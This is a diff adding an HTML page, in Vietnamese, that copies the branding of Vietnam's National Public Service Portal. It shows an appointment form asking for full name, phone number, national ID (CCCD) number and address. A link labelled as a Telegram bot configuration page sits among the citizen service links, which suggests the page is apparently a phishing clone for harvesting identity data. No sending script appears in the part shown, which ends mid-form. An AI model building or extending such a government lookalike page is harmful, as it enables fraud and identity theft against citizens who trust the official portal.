@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="vi">
+    <title>Đăng Ký Lịch Hẹn - Cổng Dịch vụ công quốc gia</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- Favicon -->
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><defs><linearGradient id='grad' x1='0%' y1='0%' x2='0%' y2='100%'><stop offset='0%' style='stop-color:%23DC143C;stop-opacity:1' /><stop offset='100%' style='stop-color:%23B22222;stop-opacity:1' /></linearGradient></defs><circle cx='50' cy='50' r='48' fill='url(%23grad)' stroke='%23FFD700' stroke-width='2'/><path d='M 50 12 L 56 35 L 80 35 L 60 48 L 68 72 L 50 58 L 32 72 L 40 48 L 20 35 L 44 35 Z' fill='%23FFD700'/><rect x='22' y='80' width='56' height='14' fill='%23DC143C' rx='2'/><text x='50' y='90' font-size='8' fill='%23FFFFFF' text-anchor='middle' font-weight='bold' font-family='Arial'>VN</text></svg>">
+</head>
+<body>
+    <!-- Main Header -->
+    <header class="main-header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo-section">
+                    <img src="logo.png" alt="Logo Cổng Dịch vụ công quốc gia" class="logo" onerror="this.onerror=null; this.src='logo.svg'; this.onerror=function(){this.style.display='none'; this.nextElementSibling.style.display='flex';};" onload="this.nextElementSibling.style.display='none';">
+                    <div class="logo-placeholder" id="logoPlaceholder">
+                        <div class="logo-emblem">
+                            <svg width="90" height="90" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                                <!-- Outer circle with gradient -->
+                                <defs>
+                                    <linearGradient id="redGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+                                        <stop offset="0%" style="stop-color:#DC143C;stop-opacity:1" />
+                                        <stop offset="100%" style="stop-color:#B22222;stop-opacity:1" />
+                                    </linearGradient>
+                                </defs>
+                                <circle cx="50" cy="50" r="48" fill="url(#redGrad)" stroke="#FFD700" stroke-width="2"/>
+                                <!-- Star with better shape -->
+                                <path d="M 50 12 L 56 35 L 80 35 L 60 48 L 68 72 L 50 58 L 32 72 L 40 48 L 20 35 L 44 35 Z" fill="#FFD700" stroke="#FFA500" stroke-width="0.5"/>
+                                <!-- Rice stalks - left -->
+                                <path d="M 18 45 Q 12 40, 15 35 Q 18 30, 22 35 Q 20 40, 18 45" fill="#FFD700" opacity="0.95"/>
+                                <path d="M 15 50 Q 10 45, 13 40 Q 16 35, 20 40 Q 18 45, 15 50" fill="#FFD700" opacity="0.9"/>
+                                <!-- Rice stalks - right -->
+                                <path d="M 82 45 Q 88 40, 85 35 Q 82 30, 78 35 Q 80 40, 82 45" fill="#FFD700" opacity="0.95"/>
+                                <path d="M 85 50 Q 90 45, 87 40 Q 84 35, 80 40 Q 82 45, 85 50" fill="#FFD700" opacity="0.9"/>
+                                <!-- Cogwheel with more detail -->
+                                <circle cx="50" cy="68" r="14" fill="#FFD700" stroke="#FFA500" stroke-width="0.5"/>
+                                <circle cx="50" cy="68" r="10" fill="#DC143C" opacity="0.3"/>
+                                <!-- Cogwheel teeth -->
+                                <rect x="48" y="54" width="4" height="10" fill="#DC143C" rx="1"/>
+                                <rect x="48" y="72" width="4" height="10" fill="#DC143C" rx="1"/>
+                                <rect x="60" y="66" width="10" height="4" fill="#DC143C" rx="1"/>
+                                <rect x="30" y="66" width="10" height="4" fill="#DC143C" rx="1"/>
+                                <rect x="56" y="60" width="6" height="4" fill="#DC143C" rx="1" transform="rotate(45 59 62)"/>
+                                <rect x="38" y="60" width="6" height="4" fill="#DC143C" rx="1" transform="rotate(-45 41 62)"/>
+                                <!-- Banner with text -->
+                                <rect x="22" y="80" width="56" height="14" fill="#DC143C" rx="2" stroke="#FFD700" stroke-width="0.5"/>
+                                <text x="50" y="90" font-size="8" fill="#FFFFFF" text-anchor="middle" font-weight="bold" font-family="Arial, sans-serif">VIỆT NAM</text>
+                            </svg>
+                        </div>
+                        <div class="logo-text-content">
+                            <div class="logo-main-text">
+                                <span class="logo-styled-c">
+                                    <svg width="35" height="35" viewBox="0 0 40 40" style="vertical-align: baseline; margin-right: 2px;">
+                                        <path d="M 20 5 Q 5 5, 5 20 Q 5 35, 20 35" stroke="#8B4513" stroke-width="3" fill="none" stroke-linecap="round"/>
+                                        <path d="M 15 10 L 20 15 L 15 20" stroke="#8B4513" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+                                        <line x1="8" y1="12" x2="12" y2="12" stroke="#8B4513" stroke-width="1.5"/>
+                                        <line x1="8" y1="18" x2="12" y2="18" stroke="#8B4513" stroke-width="1.5"/>
+                                        <line x1="8" y1="24" x2="12" y2="24" stroke="#8B4513" stroke-width="1.5"/>
+                                    </svg>
+                                </span>ỔNG DỊCH VỤ CÔNG QUỐC GIA
+                            </div>
+                            <div class="logo-tagline">Kết nối, cung cấp thông tin và dịch vụ công mọi lúc, mọi nơi</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="header-actions">
+                    <div class="theme-selector">
+                        <button class="theme-toggle" id="themeToggle" title="Chọn giao diện">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="3"/>
+                                <path d="M12 1v6m0 6v6M5.64 5.64l4.24 4.24m4.24 4.24l4.24 4.24M1 12h6m6 0h6M5.64 18.36l4.24-4.24m4.24-4.24l4.24-4.24"/>
+                            </svg>
+                        </button>
+                        <div class="theme-menu" id="themeMenu">
+                            <div class="theme-option" data-theme="brown">
+                                <div class="theme-color" style="background: #8B4513;"></div>
+                                <span>Nâu</span>
+                            </div>
+                            <div class="theme-option" data-theme="blue">
+                                <div class="theme-color" style="background: #0066cc;"></div>
+                                <span>Xanh dương</span>
+                            </div>
+                            <div class="theme-option" data-theme="red">
+                                <div class="theme-color" style="background: #DC143C;"></div>
+                                <span>Đỏ</span>
+                            </div>
+                            <div class="theme-option" data-theme="green">
+                                <div class="theme-color" style="background: #228B22;"></div>
+                                <span>Xanh lá</span>
+                            </div>
+                            <div class="theme-option" data-theme="purple">
+                                <div class="theme-color" style="background: #6A5ACD;"></div>
+                                <span>Tím</span>
+                            </div>
+                        </div>
+                    </div>
+                    <a href="#" class="btn-login">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right: 5px; vertical-align: middle;">
+                            <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path>
+                            <polyline points="10 17 15 12 10 7"></polyline>
+                            <line x1="15" y1="12" x2="3" y2="12"></line>
+                        </svg>
+                        Đăng nhập
+                    </a>
+                    <a href="#" class="btn-register">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right: 5px; vertical-align: middle;">
+                            <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
+                            <circle cx="8.5" cy="7" r="4"></circle>
+                            <line x1="20" y1="8" x2="20" y2="14"></line>
+                            <line x1="23" y1="11" x2="17" y2="11"></line>
+                        </svg>
+                        Đăng ký
+                    </a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Navigation Menu -->
+    <nav class="main-nav">
+        <div class="container">
+            <ul class="nav-menu">
+                <li class="nav-item has-submenu">
+                    <a href="#" class="nav-link">
+                        <svg class="nav-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M12 2L2 7l10 5 10-5-10-5z"></path>
+                            <path d="M2 17l10 5 10-5"></path>
+                            <path d="M2 12l10 5 10-5"></path>
+                        </svg>
+                        Thông tin và dịch vụ
+                    </a>
+                    <ul class="submenu">
+                        <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line></svg> Thủ tục hành chính</a></li>
+                        <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg> Dịch vụ công trực tuyến</a></li>
+                        <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><path d="M21 21l-4.35-4.35"></path></svg> Tra cứu hồ sơ</a></li>
+                    </ul>
+                </li>
+                <li class="nav-item"><a href="#" class="nav-link">
+                    <svg class="nav-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <line x1="12" y1="1" x2="12" y2="23"></line>
+                        <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                    </svg>
+                    Thanh toán trực tuyến
+                </a></li>
+                <li class="nav-item has-submenu">
+                    <a href="#" class="nav-link">
+                        <svg class="nav-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+                        </svg>
+                        Phản ánh kiến nghị
+                    </a>
+                    <ul class="submenu">
+                        <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg> Gửi PAKN</a></li>
+                        <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 11 12 14 22 4"></polyline><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path></svg> Tra cứu kết quả trả lời</a></li>
+                    </ul>
+                </li>
+                <li class="nav-item"><a href="#" class="nav-link">
+                    <svg class="nav-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
+                    </svg>
+                    Đánh giá chất lượng phục vụ
+                </a></li>
+                <li class="nav-item has-submenu">
+                    <a href="#" class="nav-link">
+                        <svg class="nav-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <path d="M12 16v-4"></path>
+                            <path d="M12 8h.01"></path>
+                        </svg>
+                        Hỗ trợ
+                    </a>
+                    <ul class="submenu">
+                        <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg> Giới thiệu</a></li>
+                        <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line></svg> Điều khoản sử dụng</a></li>
+                        <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4"></path><path d="M12 8h.01"></path></svg> Hướng dẫn sử dụng</a></li>
+                        <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path><path d="M13.73 21a2 2 0 0 1-3.46 0"></path></svg> Thông báo</a></li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Search Section -->
+    <section class="search-section">
+        <div class="container">
+            <div class="search-box">
+                <h2 class="search-title">Tìm kiếm nâng cao</h2>
+                <div class="search-form">
+                    <div class="search-row">
+                        <input type="text" class="search-input" placeholder="Nhập từ khoá tìm kiếm">
+                        <button type="button" class="btn-search">
+                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right: 8px; vertical-align: middle;">
+                                <circle cx="11" cy="11" r="8"></circle>
+                                <path d="M21 21l-4.35-4.35"></path>
+                            </svg>
+                            Tìm kiếm
+                        </button>
+                    </div>
+                    <div class="search-filters">
+                        <div class="filter-group">
+                            <label>Sở/Ban ngành</label>
+                            <select id="searchDepartment" class="filter-select">
+                                <option value="">-- Chọn Sở/Ban ngành --</option>
+                            </select>
+                        </div>
+                        <div class="filter-group">
+                            <label>Tỉnh/ Thành phố</label>
+                            <select id="searchProvince" class="filter-select">
+                                <option value="">-- Chọn Tỉnh/Thành phố --</option>
+                            </select>
+                        </div>
+                        <div class="filter-group">
+                            <label>Phường/Xã</label>
+                            <select id="searchWard" class="filter-select">
+                                <option value="">-- Chọn Phường/Xã --</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="container">
+            <!-- Service Categories -->
+            <div class="service-categories">
+                <div class="category-section">
+                    <h2 class="category-title">CÔNG DÂN</h2>
+                    <div class="category-links">
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="8" r="3"></circle>
+                                <path d="M12 14v7"></path>
+                                <path d="M8 12h8"></path>
+                                <path d="M8 18h8"></path>
+                                <circle cx="9" cy="11" r="1"></circle>
+                                <circle cx="15" cy="11" r="1"></circle>
+                            </svg>
+                            Có con nhỏ
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path>
+                                <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path>
+                            </svg>
+                            Học tập
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect>
+                                <path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path>
+                            </svg>
+                            Việc làm
+                        </a>
+                        <a href="telegram-config.html" class="category-link" title="Cấu hình Telegram Bot">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                                <circle cx="12" cy="10" r="3"></circle>
+                            </svg>
+                            Cấu Hình Telegram Bot
+                        </a>
+                        <a href="appointment-ubnd.html" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                <line x1="16" y1="2" x2="16" y2="6"></line>
+                                <line x1="8" y1="2" x2="8" y2="6"></line>
+                                <line x1="3" y1="10" x2="21" y2="10"></line>
+                                <path d="M8 14h.01M12 14h.01M16 14h.01M8 18h.01M12 18h.01M16 18h.01"></path>
+                            </svg>
+                            Đặt lịch hẹn làm việc với UBND
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                <line x1="16" y1="2" x2="16" y2="6"></line>
+                                <line x1="8" y1="2" x2="8" y2="6"></line>
+                                <line x1="3" y1="10" x2="21" y2="10"></line>
+                                <path d="M8 14h.01M12 14h.01M16 14h.01M8 18h.01M12 18h.01M16 18h.01"></path>
+                            </svg>
+                            Cư trú và giấy tờ tùy thân
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+                            </svg>
+                            Hôn nhân và gia đình
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                                <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                            </svg>
+                            Điện lực, nhà ở, đất đai
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                                <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                            </svg>
+                            Sức khỏe và y tế
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M5 17H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-1"></path>
+                                <path d="M12 15v2"></path>
+                                <path d="M9 6h6"></path>
+                                <circle cx="7" cy="17" r="2"></circle>
+                                <circle cx="17" cy="17" r="2"></circle>
+                            </svg>
+                            Phương tiện và người lái
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <polyline points="12 6 12 12 16 14"></polyline>
+                            </svg>
+                            Hưu trí
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                                <circle cx="12" cy="10" r="3"></circle>
+                            </svg>
+                            Người thân qua đời
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path>
+                            </svg>
+                            Giải quyết khiếu kiện
+                        </a>
+                    </div>
+                </div>
+                <div class="category-section">
+                    <h2 class="category-title">
+                        <svg class="category-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                            <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                        </svg>
+                        DOANH NGHIỆP
+                    </h2>
+                    <div class="category-links">
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <line x1="12" y1="1" x2="12" y2="23"></line>
+                                <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                            </svg>
+                            Khởi sự kinh doanh
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
+                                <circle cx="9" cy="7" r="4"></circle>
+                                <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
+                                <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
+                            </svg>
+                            Lao động và bảo hiểm xã hội
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <line x1="12" y1="1" x2="12" y2="23"></line>
+                                <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                            </svg>
+                            Tài chính doanh nghiệp
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
+                                <line x1="3" y1="9" x2="21" y2="9"></line>
+                                <line x1="9" y1="21" x2="9" y2="9"></line>
+                            </svg>
+                            Điện lực, đất đai, xây dựng
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
+                                <line x1="8" y1="21" x2="16" y2="21"></line>
+                                <line x1="12" y1="17" x2="12" y2="21"></line>
+                            </svg>
+                            Thương mại, quảng cáo
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M12 2L2 7l10 5 10-5-10-5z"></path>
+                                <path d="M2 17l10 5 10-5"></path>
+                                <path d="M2 12l10 5 10-5"></path>
+                            </svg>
+                            Sở hữu trí tuệ, đăng ký tài sản
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                                <circle cx="12" cy="10" r="3"></circle>
+                            </svg>
+                            Thành lập chi nhánh, văn phòng đại diện
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <polyline points="12 6 12 12 16 14"></polyline>
+                            </svg>
+                            Đấu thầu, mua sắm công
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path>
+                                <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
+                                <line x1="12" y1="22.08" x2="12" y2="12"></line>
+                            </svg>
+                            Tái cấu trúc doanh nghiệp
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                                <polyline points="14 2 14 8 20 8"></polyline>
+                                <line x1="16" y1="13" x2="8" y2="13"></line>
+                                <line x1="16" y1="17" x2="8" y2="17"></line>
+                                <polyline points="10 9 9 9 8 9"></polyline>
+                            </svg>
+                            Giải quyết tranh chấp hợp đồng
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="6" y="4" width="4" height="16"></rect>
+                                <rect x="14" y="4" width="4" height="16"></rect>
+                            </svg>
+                            Tạm dừng, chấm dứt hoạt động
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Appointment Form Section -->
+            <div class="appointment-section">
+                <div class="section-card">
+                    <div class="section-card-header">
+                        <h2 class="section-card-title">
+                            <svg class="section-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                <line x1="16" y1="2" x2="16" y2="6"></line>
+                                <line x1="8" y1="2" x2="8" y2="6"></line>
+                                <line x1="3" y1="10" x2="21" y2="10"></line>
+                            </svg>
+                            Đăng Ký Lịch Hẹn
+                        </h2>
+                    </div>
+                    <form id="appointmentForm" class="appointment-form">
+                        <!-- 1. Thông tin cá nhân -->
+                        <div class="form-section-header">
+                            <h3>📝 1. Thông tin cá nhân</h3>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="fullName">Họ và Tên <span class="required">*</span></label>
+                            <input type="text" id="fullName" name="fullName" maxlength="100" required placeholder="Nguyễn Văn A">
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="phone">Số Điện Thoại <span class="required">*</span></label>
+                                <input type="tel" id="phone" name="phone" required pattern="[0-9]{10,11}" maxlength="11" placeholder="09* *** ****">
+                            </div>
+                            <div class="form-group">
+                                <label for="idNumber">Số CCCD <span class="required">*</span></label>
+                                <input type="text" id="idNumber" name="idNumber" required pattern="[0-9]{9,12}" maxlength="12" placeholder="001234567890">
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="address">Địa chỉ liên hệ</label>
+                            <input type="text" id="address" name="address" maxlength="200" placeholder="Số nhà, đường, tổ, khu">
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="ward">Xã / Phường <span class="required">*</span></label>
+                                <select id="ward" name="ward" required>
+                                    <option value="">-- Chọn Xã/Phường --</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label for="province">Tỉnh / Thành Phố <span class="required">*</span></label>
+                                <select id="province" name="province" required>
+                                    <option value="">-- Chọn Tỉnh/Thành phố --</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <!-- 2. Thông tin địa điểm -->
+                        <div class="form-section-header">
+                            <h3>🗺️ 2. Thông tin địa điểm</h3>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="soBanNganh">Cơ Quan / Đơn Vị <span class="required">*</span></label>
+                                <select id="soBanNganh" name="soBanNganh" required>
+                                    <option value="">-- Chọn cơ quan --</option>
+                                    <option value="ubnd-phuong-xa">UBND Phường/Xã</option>
+                                    <option value="van-phong-thong-ke">Văn phòng - Thống kê</option>
+                                    <option value="phong-tu-phap-ho-tich">Phòng Tư pháp - Hộ tịch</option>
+                                    <option value="phong-tai-chinh-ke-hoach">Phòng Tài chính - Kế hoạch</option>
+                                    <option value="phong-van-hoa-xa-hoi">Phòng Văn hóa - Xã hội</option>
+                                    <option value="phong-kinh-te-ha-tang">Phòng Kinh tế - Hạ tầng</option>
+                                    <option value="phong-tai-nguyen-moi-truong-dia-chinh">Phòng Tài Nguyên & Môi Trường ( Địa Chính )</option>
+                                    <option value="cong-an-phuong-xa">Công an Phường/Xã</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label for="officer">Cán bộ tiếp nhận (Nếu biết)</label>
+                                <input type="text" id="officer" name="officer" maxlength="100" placeholder="Tên cán bộ">
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="appointmentDate">Ngày hẹn <span class="required">*</span></label>
+                                <div class="date-input-wrapper">
+                                    <input type="text" id="appointmentDateDisplay" class="date-display-input" placeholder="VD: 25/12/2025" required lang="vi">
+                                    <input type="date" id="appointmentDate" name="appointmentDate" class="date-input-hidden" required lang="vi">
+                                    <button type="button" class="date-picker-button" id="datePickerButton" title="Chọn ngày từ lịch" tabindex="-1" aria-label="Chọn ngày">📅</button>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label for="appointmentTime">Khung giờ <span class="required">*</span></label>
+                                <select id="appointmentTime" name="appointmentTime" required>
+                                    <option value="">-- Chọn khung giờ --</option>
+                                    <optgroup label="Buổi sáng">
+                                        <option value="07:30">07:30</option>
+                                        <option value="08:00">08:00</option>
+                                        <option value="08:30">08:30</option>
+                                        <option value="09:00">09:00</option>
+                                        <option value="09:30">09:30</option>
+                                        <option value="10:00">10:00</option>
+                                        <option value="10:30">10:30</option>
+                                        <option value="11:00">11:00</option>
+                                        <option value="11:30">11:30</option>
+                                    </optgroup>
+                                    <optgroup label="Buổi chiều">
+                                        <option value="13:30">13:30</option>
+                                        <option value="14:00">14:00</option>
+                                        <option value="14:30">14:30</option>
+                                        <option value="15:00">15:00</option>
+                                        <option value="15:30">15:30</option>
+                                        <option value="16:00">16:00</option>
+                                        <option value="16:30">16:30</option>
+                                    </optgroup>
+                                </select>
+                            </div>
+                        </div>
+
+                        <!-- 3. Nội dung công việc -->
+                        <div class="form-section-header">
